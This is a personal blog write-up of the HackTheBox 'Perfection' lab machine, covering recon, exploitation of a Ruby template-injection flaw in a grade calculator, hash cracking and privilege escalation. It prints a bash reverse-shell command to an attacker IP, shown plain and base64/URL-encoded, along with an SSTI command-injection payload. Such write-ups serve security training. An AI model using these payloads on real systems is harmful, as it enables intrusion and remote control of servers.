<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.127.0"><meta name=description content="Perplex007's Blog"><meta name=keywords content="hugo,site,new"><meta name=author content="Santhosh Vardan"><title>Perfection |
Perplex007's blog
</title><link rel=stylesheet href=/css/index_d751713.min.96a155ca235ea4110f3c74ad120b5479b57965571983ab50f129f3cafde1647957ca404764cff59009ebf300839a60e97295038187b33a85a384bdb1537f9050.css integrity="sha512-lqFVyiNepBEPPHStEgtUebV5ZVcZg6tQ8Snzyv3hZHlXykBHZM/1kAnr8wCDmmDpcpUDgYezOoWjhL2xU3+QUA=="></head><body><header class=header><div class=header_left></div><div class=header_middle>Perfection -
Perplex007's blog</div></header><main><aside class=sidebar><ul class=section-tree><li class="dir closed-dir"><span class=dir-text>Portswiggers</span><ul class=section-tree><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-bypass-xml-encoding/ title=./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-bypass-xml-encoding/>Sql Injection Vulnerbility With Filter Bypass via XML Encoding</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-where-clause/ title=./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-where-clause/>Sql Injection Vulnerbility in Where Clause Allowing Retrieval of Hidden Data</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-allowing-login-bypass/ title=./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-allowing-login-bypass/>Sql Injection Vulnerbility Allowing Login Bypass</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-database-union-attack/ title=./portswigger/sql-injection/portswigger-sql-database-union-attack/>Sql Injection Union Attack Determining the Number of Columns Returned by the Query</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-database-querying-oracle/ title=./portswigger/sql-injection/portswigger-sql-database-querying-oracle/>Sql Injection Querying Oracle</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-database-querying-non-oracle/ title=./portswigger/sql-injection/portswigger-sql-database-querying-non-oracle/>Sql Injection Querying</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-database-listing-oracle-databse/ title=./portswigger/sql-injection/portswigger-sql-database-listing-oracle-databse/>Sql Injection Listing Databse Contents</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/sql-injection/portswigger-sql-database-listing/ title=./portswigger/sql-injection/portswigger-sql-database-listing/>Sql Injection</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/portswigger/server-side-vuln/portswigger-filepath-traversal/ title=./portswigger/server-side-vuln/portswigger-filepath-traversal/>File Path Traversal Simple Case</a></li></ul></li><li class="dir opened-dir"><span class=dir-text>HackTheBoxes</span><ul class=section-tree><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/windows/htb-crafty/ title=./hackthebox/windows/htb-crafty/>Crafty</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier1/htb-sequel/ title=./hackthebox/starting-point/tier1/htb-sequel/>Sequel</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier1/htb-responder/ title=./hackthebox/starting-point/tier1/htb-responder/>Responder</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier1/htb-crocodile/ title=./hackthebox/starting-point/tier1/htb-crocodile/>Crocodile</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier1/htb-appointment/ title=./hackthebox/starting-point/tier1/htb-appointment/>Appointment</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier0/htb-meow/ title=./hackthebox/starting-point/tier0/htb-meow/>Meow</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier0/htb-fawn/ title=./hackthebox/starting-point/tier0/htb-fawn/>Fawn</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/starting-point/tier0/htb-dancing/ title=./hackthebox/starting-point/tier0/htb-dancing/>Dancing</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/linux/htb-keeper/ title=./hackthebox/linux/htb-keeper/>Keeper</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/linux/htb-perfection/ title=./hackthebox/linux/htb-perfection/>Perfection</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/linux/htb-builder/ title=./hackthebox/linux/htb-builder/>Builder</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/hackthebox/linux/htb-academy/ title=./hackthebox/linux/htb-academy/>Academy</a></li></ul></li><li class="dir closed-dir"><span class=dir-text>Bandits</span><ul class=section-tree><li class=file><a href=https://santhoshvardan-blog.vercel.app/bandit/bandit-level-5/ title=./bandit/bandit-level-5/>Level5</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/bandit/bandit-level-4/ title=./bandit/bandit-level-4/>Level4</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/bandit/bandit-level-3/ title=./bandit/bandit-level-3/>Level3</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/bandit/bandit-level-2/ title=./bandit/bandit-level-2/>Level2</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/bandit/bandit-level-1/ title=./bandit/bandit-level-1/>Level1</a></li><li class=file><a href=https://santhoshvardan-blog.vercel.app/bandit/bandit-level-0/ title=./bandit/bandit-level-0/>Level0</a></li></ul></li><li class="dir closed-dir"><span class=dir-text>Posts</span><ul class=section-tree><li class=file><a href=https://santhoshvardan-blog.vercel.app/posts/new-blog/ title=./posts/new-blog/>Hello</a></li></ul></li></ul></aside><aside class=exapandable></aside><article class=main><button class=sidebar-toggle-btn type=menu aria-expanded=false aria-haspopup=true>
<i class="bi bi-list"></i></button><div class=title><h1 class=title-header>Perfection</h1><div class=author-date-readtime><div class=author title=Author><i class="bi bi-person"></i>
<a href=/author/santhosh-vardan/ class=cat-btn>Santhosh Vardan</a></div><div class=date title=Date><i class="bi bi-calendar3"></i>
<time datetime=2024.07.19>2024.07.19</time></div><div class=readtime title="Time to Read"><i class="bi bi-clock"></i>
3 mins to read</div></div></div><div class=article-meta><div class=categories><i class="bi bi-bookmarks" title=Categories></i>
<a href=/categories/hackthebox/ class=cat-btn>hackthebox
</a><a href=/categories/perfection/ class=cat-btn>Perfection
</a><a href=/categories/linux/ class=cat-btn>linux
</a><a href=/categories/easy/ class=cat-btn>Easy</a></div><div class=breadcumb><i class="bi bi-folder"></i>
<a href=https://santhoshvardan-blog.vercel.app/ class=bread-btn><i class="bi bi-house-fill"></i>
Home
</a>/
<a href=https://santhoshvardan-blog.vercel.app/hackthebox/ class=bread-btn>HackTheBoxes
</a>/
<a href=https://santhoshvardan-blog.vercel.app/hackthebox/linux/htb-perfection/ class=bread-btn>Perfection</a></div></div><nav id=TableOfContents><ul><li><ul><li><a href=#generate-payload>Generate Payload</a></li></ul></li></ul></nav><div class=content><p>Startign with nmap</p><p><img src="https://drive.google.com/file/d/1H4Ozzfk26D-TLisbzn6UFx0dPFgK1K85/view?usp=sharing" alt></p><p><img src="https://drive.google.com/file/d/1ez-_QjWwQaRnKszcVgHRs2sAZsehdo6l/view?usp=sharing" alt></p><p>the website dashboard</p><p>checked the wappalyzer to find the technologies website is using but couldn&rsquo;t find any
I tried directory fuzzing</p><p>Found this at the bottom of the website
<img src="https://drive.google.com/file/d/1XKekjq8RdFUVWDVBGYfmmllhak3FhcRe/view?usp=sharing" alt></p><p><img src="https://drive.google.com/file/d/1MQSBNGn20s5IBurU2BIGf9n__0UxAHqm/view?usp=sharing" alt></p><p><img src="https://drive.google.com/file/d/1kmmjyqS_v8X98z5TG3JVlXTIT7pgEwYZ/view?usp=sharing" alt>
we got another info that susan is sysadmin</p><p>we can see this in the about us and there might me a vulnerability on secure coding
<img src="https://drive.google.com/file/d/1Z76wgF1M5i8oS2MdRN6VbODbjrpQj7LC/view?usp=sharing" alt></p><p>there is a input field in the website , there might be a input validation vulnerbility</p><p>let&rsquo;s do some rearch on the technologies the website is using WEBrick
<img src="https://drive.google.com/file/d/1-tXUY8I75FXBDRBPFqlWvIBM6j8LQ-dX/view?usp=sharing" alt></p><p>but there is no information about vulnerbilities
<img src="https://drive.google.com/file/d/1LB_SVbYCZBDiPbWU0jh1IrSOu_p1aiqp/view?usp=sharing" alt></p><p>the above is the robots.txt file we got something intresting</p><p>now we&rsquo;ve gatherd information available in the website the next part will be testing the inputs</p><p><img src="https://drive.google.com/file/d/1sKX0n8Mei8CJ1on8M8LUIqjDxRhHSMUy/view?usp=sharing" alt></p><p>i did burpsuite scan to get more information about the vulnerbilities and the results are</p><p><img src="https://drive.google.com/file/d/1qQrnqq_but1HKOR30nLu2fpYeXEZpvbt/view?usp=sharing" alt>
to know how to perform a scan in burpsuite refer to [[scanning with burp scanner]]
so i confirmed that there is a way to bypass the input in the calculator</p><p>after adding single &rsquo; i got this result
<img src="https://drive.google.com/file/d/1x2bhQUUHEfDAeznflZPafh1a9cevieHF/view?usp=sharing" alt></p><p>after bit of research i came to know that it is a SSTI vulnerbility (server side template injection)
refer [[SSTI vulnerbility]]</p><p><a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p><p>search for ruby payloads in this website</p><p><img src="https://drive.google.com/file/d/1-ZtkAYblN002JzRTdr6R7m3a7ckMo06q/view?usp=sharing" alt></p><p>let&rsquo;s try some payloads and see what happens
<img src="https://drive.google.com/file/d/160A-_UkBxBchLVrn80XcHw04rUrvwTgL/view?usp=sharing" alt></p><p>we&rsquo;ve got same result let&rsquo;s keep trying
to encode select the characters and do ctrl+u to do url encoding
<img src="https://drive.google.com/file/d/17llt7hOYwgfPVSZ4yuXhqAK57gWCps5Y/view?usp=sharing" alt></p><p>i&rsquo;ve multiplied 7* 7 and i got the result 49 so &lt;%= 7* 7 %> payload works</p><p>now let&rsquo;s add a linux command to thi payload to see if it works</p><p><img src="https://drive.google.com/file/d/1GMW_MAqGN427M-ty4bhGxprw-tyHZ9eM/view?usp=sharing" alt></p><p>we got susan as the username if we used whoami comamnd here</p><p>let&rsquo;s do ls and pwd to knwo the direcotries and present directory
to execute commands use ` &rsquo;these</p><p><img src="https://drive.google.com/file/d/1XQ1cnnhUm4cdCai6uOakZoXJy-qANF4Z/view?usp=sharing" alt></p><p>we got some details</p><p>using revshells.com website i created a python payload and gave me shell access</p><p><img src="https://drive.google.com/file/d/1SP6G7-nj29HlUBLMC2SOklAtJXEDgwA6/view?usp=sharing" alt></p><p>We can generate payload manually on our terminal refer to [[#Generate Payload]]</p><p><img src="https://drive.google.com/file/d/1ffKj5C1p6-Yn_t5LESaAf5bjsmpBc8FN/view?usp=sharing" alt></p><p>to get neat terminal we did
python3 -c &lsquo;import pty; pty.spawn("/bin/bash")&rsquo;</p><p>we got the user flag now</p><p><img src="https://drive.google.com/file/d/1yh68VzvzWqCARt5L8-ADB7WwLa9zp1XY/view?usp=sharing" alt></p><p><img src="https://drive.google.com/file/d/1vlVdKldSKOXtIdvFbX6e4TOfrV_G5FE6/view?usp=sharing" alt></p><p>cracking password with hash cat using this command</p><div class=codeblock><div class=copy-button-box><button class=copy-button state=copy data=hashcat%20-m%201400%20%3chashhere%3e%20-a%203%20susan_nasus_?d?d?d?d?d?d?d?d?d>
<i class="bi bi-copy"></i></button></div><pre><code>hashcat -m 1400 &lt;hashhere&gt; -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d</code></pre></div><p><img src="https://drive.google.com/file/d/18F1U5iRRsMdEvrCHxNgdXrRZ4-FSGC89/view?usp=sharing" alt></p><p>refer [[Hashcat]] to learn using hashacat</p><p>after sometime we finally cracked hashcat password
susan_nasus_413759210</p><p><img src="https://drive.google.com/file/d/1owRoHi7T1qepla3ZahOU2Hx3_C-FgzFE/view?usp=sharing" alt></p><p>using sudo bash we switched to root user and got root flag
<img src="https://drive.google.com/file/d/17dVn3vNQeRGEPc67Zs_rm5Jp_w0xzUCF/view?usp=sharing" alt></p><h3 id=generate-payload>Generate Payload</h3><p>Using hURL to encode and decode payloads demonstrates how we can mess around with data to take advantage of weaknesses in web applications.</p><p>Specifically, the payload we’re making for the Weighted Grade Calculator app is made to run a reverse shell command. This way, we can exploit any possible vulnerabilities that let us run code on the server’s side.</p><div class=codeblock><div class=copy-button-box><button class=copy-button state=copy data=%e2%94%8c%e2%94%80%e2%94%80%28kali%e3%89%bfkali%29-[~]%0a%e2%94%94%e2%94%80$%20hURL%20-B%20%22bash%20-i%20%3e&%20/dev/tcp/10.10.14.213/7373%200%3e&amp;1%22%0a%0aOriginal%20%20%20%20%20%20%20::%20bash%20-i%20%3e&%20/dev/tcp/10.10.14.213/7373%200%3e&amp;1%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0abase64%20ENcoded%20::%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx%0a%0a%e2%94%8c%e2%94%80%e2%94%80%28kali%e3%89%bfkali%29-[~]%0a%e2%94%94%e2%94%80$%20hURL%20-U%20%22YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx%22%0a%0aOriginal%20%20%20%20::%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0aURL%20ENcoded%20::%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx>
<i class="bi bi-copy"></i></button></div><pre><code>┌──(kali㉿kali)-[~]
└─$ hURL -B &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.213/7373 0&gt;&amp;1&#34;

Original       :: bash -i &gt;&amp; /dev/tcp/10.10.14.213/7373 0&gt;&amp;1                                                                                                                                                     
base64 ENcoded :: YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx

┌──(kali㉿kali)-[~]
└─$ hURL -U &#34;YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx&#34;

Original    :: YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx                                                                                                                                          
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx</code></pre></div><div class=codeblock><div class=copy-button-box><button class=copy-button state=copy data="category1=a%0A%3c%25%3Dsystem%28%22ping+-c1+$myIP%22%29;%25%3e">
<i class="bi bi-copy"></i></button></div><pre><code>category1=a%0A&lt;%25%3Dsystem(&#34;ping&#43;-c1&#43;$myIP&#34;);%25&gt;</code></pre></div><p>the above is the another paylaod from the write up</p></div></article></main><footer class=footer><div class=footer-left><ul class=social><li>All Rights Reserved ®.</li><li>Santhosh Vardan</li><li><a href=mailto:santoshvardan007@gmail.com target=_blank><i class=bi-envelope></i></a></li><li><a href=https://github.com/darkrider00 target=_blank><i class=bi-github></i></a></li><li><a href=https://www.linkedin.com/in/perplex007/ target=_blank><i class=bi-linkedin></i></a></li><li><a href=https://t.me/the_last_uzumaki_0 target=_blank><i class=bi-telegram></i></a></li><li><a href=https://x.com/perplex_007 target=_blank><i class=bi-twitter></i></a></li></ul></div><div class=footer-right><ul class="control status clearfix"><li>Word Count:
479</li><li>en</li><li><a href=https://gohugo.io class=btn target=_blank>Hugo: 0.127.0</a></li><li><a href=https://github.com/JingWangTW/dark-theme-editor class=btn target=_blank>Theme: dark-theme-editor</a></li><li>Last modified: &nbsp;
<time>Jul 19 2024 14:39:25</time></li><li title></li></ul></div></footer></body><script type=text/javascript src=/js/index_d751713.min.5eeb120f16ea146352725c420364f87befead45f678142b8f0ffbef024646931fbc06bff07a7bd6cb57fa2f8cd8a21ba6a4ee5a278ec32303a378bc1cd17f246.js integrity="sha512-XusSDxbqFGNSclxCA2T4e+/q1F9ngUK48P++8CRkaTH7wGv/B6e9bLV/ovjNiiG6ak7lonjsMjA6N4vBzRfyRg=="></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css></html>